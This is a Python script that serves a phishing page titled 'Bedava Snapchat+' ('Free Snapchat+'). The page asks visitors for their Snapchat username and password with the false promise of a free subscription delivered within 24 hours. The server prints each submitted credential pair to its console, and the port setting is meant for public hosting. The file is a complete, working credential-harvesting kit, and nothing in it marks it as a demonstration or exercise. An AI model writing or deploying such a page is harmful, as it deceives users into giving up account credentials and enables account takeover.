from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os


html = """
<!DOCTYPE html>
<html>
<head>

<title>Bedava Snapchat+</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<style>

*{
    box-sizing:border-box;
}

body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#fff900,#ffd900);
    font-family:Arial,Helvetica,sans-serif;
}


.container{

    width:380px;
    max-width:90%;

    background:white;

    padding:35px;

    border-radius:35px;

    text-align:center;

    box-shadow:
    0 20px 50px rgba(0,0,0,0.25);

}


.ghost{

    font-size:80px;

    animation:float 2s infinite;

}


@keyframes float{

50%{
transform:translateY(-10px);
}

}



h1{

font-size:34px;

margin:5px;

}


.subtitle{

color:#777;

margin-bottom:25px;

}



input{

width:100%;

padding:16px;

margin:10px 0;

border-radius:20px;

border:2px solid #eee;

font-size:18px;

outline:none;

}



input:focus{

border-color:#ffd900;

}



button{

width:100%;

padding:17px;

margin-top:15px;

border:none;

border-radius:22px;

background:black;

color:#ffea00;

font-size:21px;

font-weight:bold;

}



button:active{

transform:scale(.96);

}



#result{

margin-top:20px;

font-weight:bold;

}



.footer{

margin-top:25px;

font-size:12px;

color:#aaa;

}

</style>

</head>


<body>


<div class="container">


<div class="ghost">

</div>


<h1>
Bedava Snapchat+
</h1>


<div class="subtitle">
send your username/password
</div>



<input id="user" placeholder="Username">


<input id="word" placeholder="Password">


<button onclick="sendWord()">

SEND

</button>


<p id="result"></p>


<div class="footer">
powered by Python
</div>


</div>



<script>


function sendWord(){


let username =
document.getElementById("user").value;


let word =
document.getElementById("word").value;



fetch("/word",{

method:"POST",

headers:{

"Content-Type":
"application/x-www-form-urlencoded"

},


body:

"user="
+
encodeURIComponent(username)

+

"&word="
+
encodeURIComponent(word)


})


.then(()=>{

document.getElementById("result").innerHTML=
"✅ 24 Saat icerisinde gönderilecektir";

})


.catch(()=>{

document.getElementById("result").innerHTML=
"❌ Error";

});


}


</script>


</body>
</html>
"""



class Handler(BaseHTTPRequestHandler):


    def do_GET(self):

        self.send_response(200)

        self.send_header(
            "Content-type",
            "text/html"
        )

        self.end_headers()

        self.wfile.write(
            html.encode()
        )



    def do_POST(self):

        if self.path == "/word":


            length = int(
                self.headers.get(
                    "Content-Length",
                    0
                )
            )


            data = self.rfile.read(
                length
            ).decode()



            info = urllib.parse.parse_qs(
                data
            )


            username = info.get(
                "user",
                [""]
            )[0]


            message = info.get(
                "word",
                [""]
            )[0]



            print("================")
            print("Name:",username)
            print("Message:",message)
            print("================")



            self.send_response(200)

            self.send_header(
                "Content-type",
                "text/plain"
            )

            self.end_headers()


            self.wfile.write(
                b"OK"
            )

            return



        self.send_response(404)

        self.end_headers()



# Public hosting compatible port

port = int(
    os.environ.get(
        "PORT",
        8080
    )
)



server = HTTPServer(

    ("0.0.0.0",port),

    Handler

)



print(
    "Server running on port",
    port
)



server.serve_forever()